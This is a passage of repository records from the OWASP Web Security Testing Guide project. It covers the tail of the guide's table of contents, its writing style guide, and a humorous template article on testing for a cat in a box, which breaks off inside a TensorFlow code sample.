4.2.7 [Test HTTP Strict Transport Security](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/07-Test_HTTP_Strict_Transport_Security.md)\n\n#### 4.2.8 [Test RIA Cross Domain Policy](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/08-Test_RIA_Cross_Domain_Policy.md)\n\n#### 4.2.9 [Test File Permission](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/09-Test_File_Permission.md)\n\n#### 4.2.10 [Test for Subdomain Takeover](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover.md)\n\n#### 4.2.11 [Test Cloud Storage](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/11-Test_Cloud_Storage.md)\n\n#### 4.2.12 [Test for Content Security Policy](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/12-Test_for_Content_Security_Policy.md)\n\n#### 4.2.13 [Test for Path Confusion](4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/13-Test_for_Path_Confusion.md)\n\n### 4.3 [Identity Management Testing](4-Web_Application_Security_Testing/03-Identity_Management_Testing/README.md)\n\n#### 4.3.1 [Test Role Definitions](4-Web_Application_Security_Testing/03-Identity_Management_Testing/01-Test_Role_Definitions.md)\n\n#### 4.3.2 [Test User Registration Process](4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process.md)\n\n#### 4.3.3 [Test Account Provisioning Process](4-Web_Application_Security_Testing/03-Identity_Management_Testing/03-Test_Account_Provisioning_Process.md)\n\n#### 4.3.4 [Testing for Account Enumeration and Guessable User Account](4-Web_Application_Security_Testing/03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md)\n\n#### 4.3.5 [Testing for Weak or Unenforced Username Policy](4-Web_Application_Security_Testing/03-Identity_Management_Testing/05-Testing_for_Weak_or_Unenforced_Username_Policy.md)\n\n### 4.4 [Authentication Testing](4-Web_Application_Security_Testing/04-Authentication_Testing/README.md)\n\n#### 4.4.1 [Testing for Credentials Transported over an Encrypted Channel](4-Web_Application_Security_Testing/04-Authentication_Testing/01-Testing_for_Credentials_Transported_over_an_Encrypted_Channel.md)\n\n#### 4.4.2 [Testing for Default Credentials](4-Web_Application_Security_Testing/04-Authentication_Testing/02-Testing_for_Default_Credentials.md)\n\n#### 4.4.3 [Testing for Weak Lock Out Mechanism](4-Web_Application_Security_Testing/04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md)\n\n#### 4.4.4 [Testing for Bypassing Authentication Schema](4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Bypassing_Authentication_Schema.md)\n\n#### 4.4.5 [Testing for Vulnerable Remember Password](4-Web_Application_Security_Testing/04-Authentication_Testing/05-Testing_for_Vulnerable_Remember_Password.md)\n\n#### 4.4.6 [Testing for Browser Cache Weaknesses](4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses.md)\n\n#### 4.4.7 [Testing for Weak Authentication Methods](4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Authentication_Methods.md)\n\n#### 4.4.8 [Testing for Weak Security Question Answer](4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer.md)\n\n#### 4.4.9 [Testing for Weak Password Change or Reset Functionalities](4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities.md)\n\n#### 4.4.10 [Testing for Weaker Authentication in Alternative Channel](4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel.md)\n\n#### 4.4.11 [Testing Multi-Factor Authentication](4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication.md)\n\n### 4.5 [Authorization Testing](4-Web_Application_Security_Testing/05-Authorization_Testing/README.md)\n\n#### 4.5.1 [Testing Directory Traversal File Include](4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)\n\n#### 4.5.2 [Testing for Bypassing Authorization Schema](4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md)\n\n#### 4.5.3 [Testing for Privilege Escalation](4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation.md)\n\n#### 4.5.4 [Testing for Insecure Direct Object References](4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.md)\n\n#### 4.5.5 [Testing for OAuth Weaknesses](4-Web_Application_Security_Testing/05-Authorization_Testing/05-Testing_for_OAuth_Weaknesses.md)\n\n##### 4.5.5.1 [Testing for OAuth Authorization Server Weaknesses](4-Web_Application_Security_Testing/05-Authorization_Testing/05.1-Testing_for_OAuth_Authorization_Server_Weaknesses.md)\n\n##### 4.5.5.2 [Testing for OAuth Client Weaknesses](4-Web_Application_Security_Testing/05-Authorization_Testing/05.2-Testing_for_OAuth_Client_Weaknesses.md)\n\n### 4.6 [Session Management Testing](4-Web_Application_Security_Testing/06-Session_Management_Testing/README.md)\n\n#### 4.6.1 [Testing for Session Management Schema](4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md)\n\n#### 4.6.2 [Testing for Cookies Attributes](4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md)\n\n#### 4.6.3 [Testing for Session Fixation](4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md)\n\n#### 4.6.4 [Testing for Exposed Session Variables](4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables.md)\n\n#### 4.6.5 [Testing for Cross Site Request Forgery](4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)\n\n#### 4.6.6 [Testing for Logout Functionality](4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality.md)\n\n#### 4.6.7 [Testing Session Timeout](4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout.md)\n\n#### 4.6.8 [Testing for Session Puzzling](4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling.md)\n\n#### 4.6.9 [Testing for Session Hijacking](4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking.md)\n\n#### 4.6.10 [Testing JSON Web Tokens](4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens.md)\n\n#### 4.6.11 [Testing for Concurrent Sessions](4-Web_Application_Security_Testing/06-Session_Management_Testing/11-Testing_for_Concurrent_Sessions.md)\n\n### 4.7 [Input Validation Testing](4-Web_Application_Security_Testing/07-Input_Validation_Testing/README.md)\n\n#### 4.7.1 [Testing for Reflected Cross Site Scripting](4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting.md)\n\n#### 4.7.2 [Testing for Stored Cross Site Scripting](4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting.md)\n\n#### 4.7.3 [Testing for HTTP Verb Tampering](4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering.md)\n\n#### 4.7.4 [Testing for HTTP Parameter Pollution](4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution.md)\n\n#### 4.7.5 [Testing for SQL Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection.md)\n\n##### 4.7.5.1 [Testing for Oracle](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle.md)\n\n##### 4.7.5.2 [Testing for MySQL](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL.md)\n\n##### 4.7.5.3 [Testing for SQL Server](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md)\n\n##### 4.7.5.4 [Testing PostgreSQL](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md)\n\n##### 4.7.5.5 [Testing for MS Access](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md)\n\n##### 4.7.5.6 [Testing for NoSQL Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection.md)\n\n##### 4.7.5.7 [Testing for ORM Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection.md)\n\n##### 4.7.5.8 [Testing for Client-side](4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side.md)\n\n#### 4.7.6 [Testing for LDAP Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md)\n\n#### 4.7.7 [Testing for XML Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection.md)\n\n#### 4.7.8 [Testing for SSI Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection.md)\n\n#### 4.7.9 [Testing for XPath Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection.md)\n\n#### 4.7.10 [Testing for IMAP SMTP Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection.md)\n\n#### 4.7.11 [Testing for Code Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection.md)\n\n##### 4.7.11.1 [Testing for File Inclusion](4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_File_Inclusion.md)\n\n#### 4.7.12 [Testing for Command Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection.md)\n\n#### 4.7.13 [Testing for Format String Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection.md)\n\n#### 4.7.14 [Testing for Incubated Vulnerability](4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability.md)\n\n#### 4.7.15 [Testing for HTTP Splitting Smuggling](4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling.md)\n\n#### 4.7.16 [Testing for HTTP Incoming Requests](4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests.md)\n\n#### 4.7.17 [Testing for Host Header Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection.md)\n\n#### 4.7.18 [Testing for Server-side Template Injection](4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection.md)\n\n#### 4.7.19 [Testing for Server-Side Request Forgery](4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery.md)\n\n#### 4.7.20 [Testing for Mass Assignment](4-Web_Application_Security_Testing/07-Input_Validation_Testing/20-Testing_for_Mass_Assignment.md)\n\n### 4.8 [Testing for Error Handling](4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/README.md)\n\n#### 4.8.1 [Testing for Improper Error Handling](4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling.md)\n\n#### 4.8.2 [Testing for Stack Traces](4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces.md)\n\n### 4.9 [Testing for Weak Cryptography](4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README.md)\n\n#### 4.9.1 [Testing for Weak Transport Layer Security](4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security.md)\n\n#### 4.9.2 [Testing for Padding Oracle](4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle.md)\n\n#### 4.9.3 [Testing for Sensitive Information Sent via Unencrypted Channels](4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md)\n\n#### 4.9.4 [Testing for Weak Encryption](4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption.md)\n\n### 4.10 [Business Logic Testing](4-Web_Application_Security_Testing/10-Business_Logic_Testing/README.md)\n\n#### 4.10.0 [Introduction to Business Logic](4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic.md)\n\n#### 4.10.1 [Test Business Logic Data Validation](4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation.md)\n\n#### 4.10.2 [Test Ability to Forge Requests](4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests.md)\n\n#### 4.10.3 [Test Integrity Checks](4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks.md)\n\n#### 4.10.4 [Test for Process Timing](4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing.md)\n\n#### 4.10.5 [Test Number of Times a Function Can Be Used Limits](4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits.md)\n\n#### 4.10.6 [Testing for the Circumvention of Work Flows](4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows.md)\n\n#### 4.10.7 [Test Defenses Against Application Misuse](4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse.md)\n\n#### 4.10.8 [Test Upload of Unexpected File Types](4-Web_Application_Security_Testing/10-Business_Logic_Testing/08-Test_Upload_of_Unexpected_File_Types.md)\n\n#### 4.10.9 [Test Upload of Malicious Files](4-Web_Application_Security_Testing/10-Business_Logic_Testing/09-Test_Upload_of_Malicious_Files.md)\n\n#### 4.10.10 [Test Payment Functionality](4-Web_Application_Security_Testing/10-Business_Logic_Testing/10-Test-Payment-Functionality.md)\n\n### 4.11 [Client-side Testing](4-Web_Application_Security_Testing/11-Client-side_Testing/README.md)\n\n#### 4.11.1 [Testing for DOM-Based Cross Site Scripting](4-Web_Application_Security_Testing/11-Client-side_Testing/01-Testing_for_DOM-based_Cross_Site_Scripting.md)\n\n##### 4.11.1.1 [Testing for Self DOM Based Cross-Site Scripting](4-Web_Application_Security_Testing/11-Client-side_Testing/01.1-Testing_for_Self_DOM_Based_Cross_Site_Scripting.md)\n\n#### 4.11.2 [Testing for JavaScript Execution](4-Web_Application_Security_Testing/11-Client-side_Testing/02-Testing_for_JavaScript_Execution.md)\n\n#### 4.11.3 [Testing for HTML Injection](4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection.md)\n\n#### 4.11.4 [Testing for Client-side URL Redirect](4-Web_Application_Security_Testing/11-Client-side_Testing/04-Testing_for_Client-side_URL_Redirect.md)\n\n#### 4.11.5 [Testing for CSS Injection](4-Web_Application_Security_Testing/11-Client-side_Testing/05-Testing_for_CSS_Injection.md)\n\n#### 4.11.6 [Testing for Client-side Resource Manipulation](4-Web_Application_Security_Testing/11-Client-side_Testing/06-Testing_for_Client-side_Resource_Manipulation.md)\n\n#### 4.11.7 [Testing Cross Origin Resource Sharing](4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing.md)\n\n#### 4.11.8 [Testing for Cross Site Flashing](4-Web_Application_Security_Testing/11-Client-side_Testing/08-Testing_for_Cross_Site_Flashing.md)\n\n#### 4.11.9 [Testing for Clickjacking](4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.md)\n\n#### 4.11.10 [Testing WebSockets](4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets.md)\n\n#### 4.11.11 [Testing Web Messaging](4-Web_Application_Security_Testing/11-Client-side_Testing/11-Testing_Web_Messaging.md)\n\n#### 4.11.12 [Testing Browser Storage](4-Web_Application_Security_Testing/11-Client-side_Testing/12-Testing_Browser_Storage.md)\n\n#### 4.11.13 [Testing for Cross Site Script Inclusion](4-Web_Application_Security_Testing/11-Client-side_Testing/13-Testing_for_Cross_Site_Script_Inclusion.md)\n\n#### 4.11.14 [Testing for Reverse Tabnabbing](4-Web_Application_Security_Testing/11-Client-side_Testing/14-Testing_for_Reverse_Tabnabbing.md)\n\n### 4.12 [API Testing](4-Web_Application_Security_Testing/12-API_Testing/README.md)\n\n#### 4.12.0 [API Testing Overview](4-Web_Application_Security_Testing/12-API_Testing/00-API_Testing_Overview.md)\n\n#### 4.12.1 [API Reconnaissance](4-Web_Application_Security_Testing/12-API_Testing/01-API_Reconnaissance.md)\n\n#### 4.12.2 [API Broken Object Level Authorization](4-Web_Application_Security_Testing/12-API_Testing/02-API_Broken_Object_Level_Authorization.md)\n\n#### 4.12.99 [Testing GraphQL](4-Web_Application_Security_Testing/12-API_Testing/99-Testing_GraphQL.md)\n\n## 5. [Reporting](5-Reporting/README.md)\n\n### 5.1 [Reporting Structure](5-Reporting/01-Reporting_Structure.md)\n\n### 5.2 [Naming Schemes](5-Reporting/02-Naming_Schemes.md)\n\n## Appendix A. [Testing Tools Resource](6-Appendix/A-Testing_Tools_Resource.md)\n\n## Appendix B. [Suggested Reading](6-Appendix/B-Suggested_Reading.md)\n\n## Appendix C. [Fuzzing](6-Appendix/C-Fuzzing.md)\n\n## Appendix D. [Encoded Injection](6-Appendix/D-Encoded_Injection.md)\n\n## Appendix E. [History](6-Appendix/E-History.md)\n\n## Appendix F. [Leveraging Dev Tools](6-Appendix/F-Leveraging_Dev_Tools.md)\n", "timestamp": "2025-10-24T11:40:01.635693"}
{"source": "github", "repo": "OWASP/wstg", "file": "style_guide.md", "url": "https://github.com/OWASP/wstg/blob/master/style_guide.md", "content": "# Style Guide\n\nThe Web Security Testing Guide (WSTG) is a well-known document trusted by security professionals and organizations all over the world. These guidelines help ensure it reflects well on its many contributors and the security community.\n\nTo maintain the quality of the WSTG, please follow these general rules.\n\n1. Be factual, specific, and ensure paragraphs are focused on their heading.\n2. Ensure information is creditable and up to date. Provide links and citations where appropriate.\n3. Avoid duplicating content. To refer to existing content, link to it inline.\n\n## Write for the Reader\n\nReaders of the WSTG come from many different countries and have varying levels of technical expertise. Write for an international audience with a basic technical background. Use words that are likely understood by a non-native English speaker. Use short sentences that are easy to understand.\n\nThe web tool [Hemingway](https://hemingwayapp.com/) can help you write with clarity.\n\n## Formatting\n\nUse consistent formatting to help us review and publish content, and help readers to digest information. Write all content using [Markdown syntax](https://guides.github.com/features/mastering-markdown/#examples).\n\nPlease follow these further guidelines for formatting.\n\n### Article Template\n\nWe use an article template to help ensure topics are complete and easy to understand. Please use the [template materials](template) to structure new content.\n\n### Project Folder Structure\n\nWhen adding articles and images, please place articles in the appropriate sub-section directory. Place images in an `images/` folder within the article directory. Here is an example of the project structure:\n\n```sh\ndocument/\n ├───0_Foreword/\n │   └───0_Foreword.md\n ├───1_Frontispiece/\n │   ├───images/\n │   │   └───example.jpg\n │   └───1_Frontispiece.md\n ├───2_Introduction/\n │   ├───images/\n │   │   └───example.jpg\n │   └───2_Introduction.md\n ├───3_The_OWASP_Testing_Framework/\n │   ├───images/\n │   │   └───example.jpg\n │   └───3_The_OWASP_Testing_Framework.md\n ├───4_Web_Application_Security_Testing/\n │   ├───4.1_Introduction_and_Objectives/\n │   │   └───4.1_Testing_Introduction_and_Objectives.md\n │   ├───4.2_Information_Gathering/\n │   │   ├───images/\n │   │   │   └───example.jpg\n │   │   ├───4.2_Testing_Information_Gathering.md\n │   │   └───4.2.1_Conduct_Search_Engine_Discovery.md\n\n```\n\n### Code Syntax Highlighting\n\nUse code fences with syntax highlighting for snippets. For example:\n\n```md\n    ```javascript\n    if (isAwesome){\n        return true\n    }\n    ```\n```\n\n### Caption Images\n\nCaption images and figures using title case. Use the section and sub-section numbers, followed by the figure position in the document. Use the format `Figure <section>.<sub-section>-<position>: Caption Title`.\n\nFor example, caption the first image shown in section 4.8, sub-section 19 as follows:\n\n```md\n![SSTI XVWA Example](images/SSTI_XVWA.jpeg)\\\n*Figure 4.7.19-1: SSTI XVWA Example*\n```\n\n### Inline Links\n\nAdd links inline. Use words in the sentence to describe them, or include their specific title. For example:\n\n```md\nThis project provides a [style guide](style_guide.md). Some style choices are taken from the [Chicago Manual of Style](https://www.chicagomanualofstyle.org/).\n```\n\n### Inline References\n\nFor resources where a link is not available, such as a whitepaper or book, we prefer a conversational in-line reference rather than any academic-styled citation. Work the title of the resource as well as its author into your text. For example:\n\n> There are three possible cases: only the whale exists, only the petunias exist, or both the whale and petunias exist simultaneously. These possibilities are referenced in a series of books entitled *The Hitchhiker's Guide to the Galaxy,* by Douglas Adams.\n\nThis format has the advantage of continuing the flow of the article and not inviting readers to jump from paragraph to paragraph, looking for an asterisk, or to another location to find a reference list. It's also easy to read and to maintain since it appears in just one place.\n\n### Bold, Italic, and Underline\n\nDo not use bold, italic, or underlined text for emphasis.\n\nYou may italicize a word when referring to the word itself, though the need for this in technical writing is rare. For examples, see the section [Use Correct Words](#use-correct-words). Use asterisks: `*italic*`.\n\n## Language and Grammar\n\nTo make the WSTG consistent and pleasant to read, please check your spelling (we use American English) and use proper grammar.\n\nThe sections below describe specific style choices to follow.\n\n### Title Case\n\nUse title case for headings, following the [Chicago Manual of Style](https://www.chicagomanualofstyle.org/book/ed17/frontmatter/toc.html). The \"Chicago\" tab on the website [Capitalize My Title](https://capitalizemytitle.com/#Chicago) may help.\n\n### Active Voice\n\nAvoid using passive voice. For example:\n\n> Bad: \"Vulnerabilities are found by running tests.\"  \n> Good: \"Run tests to find vulnerabilities.\"  \n\n### Second Person\n\nDo not write in the first or third person, such as by using *I* or *he*. When giving technical instruction, address the reader in the second person. Use a [zero or implied subject](https://en.wikipedia.org/wiki/Subject_(grammar)#Forms_of_the_subject), or if you must, use *you*.\n\n> Bad: \"He/she/an IT monkey would run this code to test...\"  \n> Better: \"By running this code, you can test...\"  \n> Best: \"Run this code to test...\"\n\n### Numbering Conventions\n\nFor numbers from zero to ten, write the word. For numbers higher than ten, use integers. For example:\n\n> One broken automated test finds 42 errors if you run it ten times.\n\nDescribe simple fractions in words. For example:\n\n> Half of all software developers like petunias, and a third of them like whales.\n\nWhen describing an approximate magnitude of monetary value, write the whole word and do not abbreviate. For example:\n\n> Bad: \"Security testing saves companies $18M in beer every year.\"  \n> Good: \"Security testing saves companies eighteen million dollars in beer every year.\"\n\nFor specific monetary value, use currency symbols and integers. For example:\n\n> A beer costs $6.75 today, and $8.25 tomorrow.\n\n### Abbreviations\n\nExplain abbreviations the first time they appear in your document. Capitalize the appropriate words to indicate the abbreviated form. For example:\n\n> This project contains the source code for the Web Security Testing Guide (WSTG). The WSTG is a nice and accurate book.\n\n### Lists and Punctuation\n\nUse bulleted lists when the order is unimportant. Use numbered lists for sequential steps. For each line, capitalize the first word. If the line is a sentence or completes a sentence, end with a period. For example:\n\n> Testing this scenario will:\n>\n> - Make the application safer.\n> - Improve overall security posture.\n> - Keep customers happy.\n>\n> To test this scenario:\n>\n> 1. Copy the code.\n> 2. Open a terminal.\n> 3. Run the code as root.\n>\n> Here are some foods to snack on while testing.\n>\n> - Apples\n> - Beef jerky\n> - Chocolate\n\nFor lists in a sentence, use serial or [Oxford commas](https://www.grammarly.com/blog/what-is-the-oxford-comma-and-why-do-people-care-so-much-about-it/). For example:\n\n> Test the application using automated tests, static code review, and penetration tests.\n\n### Use Correct Words\n\nThe following section covers some frequently misused words and instructions on how to correctly use them.\n\n#### *and/or*\n\nWhile sometimes used in legal documents, *and/or* leads to ambiguity and confusion in technical writing. Instead, use *or*, which in the English language includes *and*. For example:\n\n> Bad: \"The code will output an error number and/or description.\"  \n> Good: \"The code will output an error number or description.\"\n\nThe latter sentence does not exclude the possibility of having both an error number and description.\n\nIf you need to specify all possible outcomes, use a list:\n\n> \"The code will output an error number, or a description, or both.\"\n\n#### *frontend, backend*\n\nWhile it's true that the English language evolves over time, these are not yet words.\n\nWhen referring to nouns, use *front end* and *back end*. For example:\n\n> Security is equally important on the front end as it is on the back end.\n\nAs a descriptive adverb, use the hyphenated *front-end* and *back-end*.\n\n> Both front-end developers and back-end developers are responsible for application security.\n\n#### *whitebox*, *blackbox*, *greybox*\n\nThese are not words.\n\nAs nouns, use *white box*, *black box*, and *grey box*. These nouns rarely appear in connection with cybersecurity.\n\n> My cat enjoys jumping into that grey box.\n\nAs adverbs, use the hyphenated *white-box*, *black-box*, and *grey-box*. Do not use capitalization unless the words are in a title.\n\n> While white-box testing involves knowledge of source code, black-box testing does not. A grey-box test is somewhere in-between.\n\n#### *ie*, *eg*\n\nThese are letters.\n\nThe abbreviation *ie* refers to the Latin `id est`, which means \"in other words.\" The abbreviation *eg* is for `exempli gratia`, translating to \"for example.\" To use these in a sentence:\n\n> Write using proper English, i.e. correct spelling and grammar. Use common words over uncommon ones, e.g. \"learn\" instead of \"glean.\"\n\n#### *etc*\n\nThese are also letters.\n\nThe Latin phrase *et cetera* translates to \"and the rest.\" It is abbreviated and typically placed at the end of a list that seems redundant to complete:\n\n> WSTG authors like rainbow colors, such as red, yellow, green, etc.\n\nIn technical writing, the use of *etc* is problematic. It assumes that the reader knows what you're talking about, and they may not. Violet is one of the colors of the rainbow, but the example above does not explicitly tell you if violet is a color that WSTG authors like.\n\nIt is better to be explicit and thorough than to make assumptions of the reader. Only use *etc* to avoid completing a list that was given in full earlier in the document.\n\n#### *...* (ellipsis)\n\nThe ellipsis punctuation mark can indicate that words have been left out of a quote:\n\n> Linus Torvalds once said, \"Once you realize that documentation should be laughed at... THEN, and only then, have you reached the level where you can safely read it and try to use it to actually implement a driver. \"\n\nAs long as the omission does not change the meaning of the quote, this is acceptable usage of ellipsis in the WSTG.\n\nAll other uses of ellipsis, such as to indicate an unfinished thought, are not.\n\n#### *ex*\n\nWhile this is a word, it is likely not the word you are looking for. The word *ex* has particular meaning in the fields of finance and commerce, and may refer to a person if you are discussing your past relationships. None of these topics should appear in the WSTG.\n\nThe abbreviation may be used to mean \"example\" by lazy writers. Please don't be lazy, and write *example* instead.\n", "timestamp": "2025-10-24T11:40:02.139876"}
{"source": "github", "repo": "OWASP/wstg", "file": "template/999-Foo_Testing/1-Testing_for_a_Cat_in_a_Box.md", "url": "https://github.com/OWASP/wstg/blob/master/template/999-Foo_Testing/1-Testing_for_a_Cat_in_a_Box.md", "content": "# Testing for a Cat in a Box\n\n|ID          |\n|------------|\n|WSTG-FOO-001|\n\n## Summary\n\nA [box](https://en.wikipedia.org/wiki/Box) is a tangible object, typically made up of six rectangular sides. It typically has the ability to be open or closed, and to contain things. Boxes are often used to transport other objects, or to store objects temporarily or permanently. Boxes can be constructed from various materials, such as cardboard, wood, or steel.\n\nA box may or may not contain a [cat](https://en.wikipedia.org/wiki/Cat).\n\nIf a box has a cat in it and the box owner does not know, the box owner is vulnerable to surprise or shock if they discover the cat unexpectedly.\n\n## Test Objectives\n\nAssess whether a box contains a cat.\n\n## How to Test\n\nTo test for a cat in a box, use any of the following methods.\n\n### Open the Box and Observe its Interior\n\nThese instructions assume the box is constructed of cardboard. You may need to modify the steps slightly to accommodate other materials.\n\n[![Box](images/box.jpg \"An empty box made of corrugated fiberboard\")](https://en.wikipedia.org/wiki/Box)\\\n*Figure 999.1-1: Image of an Empty Open Cardboard Box*\n\nUse the following steps to open the box.\n\n1. If the box is taped shut, use a knife to cut the tape. Be cautious of putting the knife too far into the box, just in case it does contain a cat.\n2. If the box is not taped shut, grasp each cardboard flap and open it.\n\nOnce the box is open, observe the interior of the box to determine if there is a cat inside.\n\n### Compel the Cat to Reveal Itself\n\nThis test is based on observing a reaction from the cat in the box, if there is one. While it is a valid method, it is not as definite as the first test method.\n\nA reaction may be:\n\n- Sounds of mewing or the shuffling of tiny cat paws.\n- The appearance of various parts of a cat, such as ears, tail, or paws, from any holes or open areas of the box.\n- A cat exiting the box.\n\nAttempt to compel a reaction from the possible cat in the box by using any of these tactics:\n\n- Scratch gently on the exterior of the box.\n- Place catnip near the box.\n- Using a bowl and some corn kernels, replicate the sound of dry cat food being poured into a cat bowl.\n\nIf no cat reveals itself, it is unlikely there is a cat in the box. However, this test is indefinite. It may be possible to say that there both is and is not a cat in the box.\n\n[![GHZ state](images/ghz-state.svg \"An equation for GHZ state in quantum computing\")](https://en.wikipedia.org/wiki/Schr%C3%B6dinger%27s_cat)\\\n*Figure 999.1-2: Equation for Quantum Computing \"Cat State\" or GHZ State*\n\n### Use a Box Camera\n\nSet up a wireless camera inside the box to continuously monitor for cats inside. This test requires the following steps.\n\n#### 1. Acquire a Camera\n\nThe camera must:\n\n1. Fit inside the box.\n2. Leave enough room in the box for a cat to also fit in the box.\n3. Have the ability to wirelessly display its video feed.\n\n#### 2. Set Up Camera\n\nMount the camera inside the box using provided hardware, or duct tape. Follow the manufacturer's instructions to set up the camera and make the video feed available. For example, you may be able to view the video feed on your local network at an address beginning with `https://localhost:`.\n\n#### 3. Monitor the Video Feed\n\nManually view the video feed at periodic intervals to determine if there is a cat in view. Alternatively, use image recognition software to monitor the feed and send an alert if it detects a cat. Here is some tangentially related [TensorFlow code for defining a model](https://www.tensorflow.org/tutorials/images/segmentation#define_the_model):\n\n```py\nbase_model = tf.keras.applications.MobileNetV2(input_shape=[128, 128, 3], include_top=False)\n\n# Use the activations of these layers\nlayer_names = [\n    'block_1_expand_relu',   # 64x64\n    'block_3_expand_relu',   # 